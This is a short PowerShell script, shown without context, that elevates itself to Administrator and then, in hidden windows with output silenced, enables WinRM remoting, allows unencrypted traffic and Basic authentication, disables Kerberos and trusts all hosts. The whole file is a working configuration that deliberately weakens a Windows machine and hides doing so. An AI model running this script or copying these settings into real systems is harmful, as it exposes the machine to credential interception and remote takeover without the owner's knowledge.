if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
powershell -windowstyle hidden -command Enable-PSRemoting -force | Out-Null
winrm quickconfig -quiet | Out-Null
winrm set winrm/config/service '@{AllowUnencrypted="true"}' | Out-Null
winrm set winrm/config/service/auth '@{Basic="true"}' | Out-Null
winrm set winrm/config/service/auth '@{Kerberos="false"}' | Out-Null
powershell -windowstyle hidden -command Set-Service WinRM -StartMode Automatic | Out-Null
powershell -windowstyle hidden -command Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"} | Out-Null
powershell -windowstyle hidden -command Set-Item -force WSMan:localhost\client\trustedhosts -value * | Out-Null
powershell -windowstyle hidden -command Restart-Service -Force WinRM | Out-Null
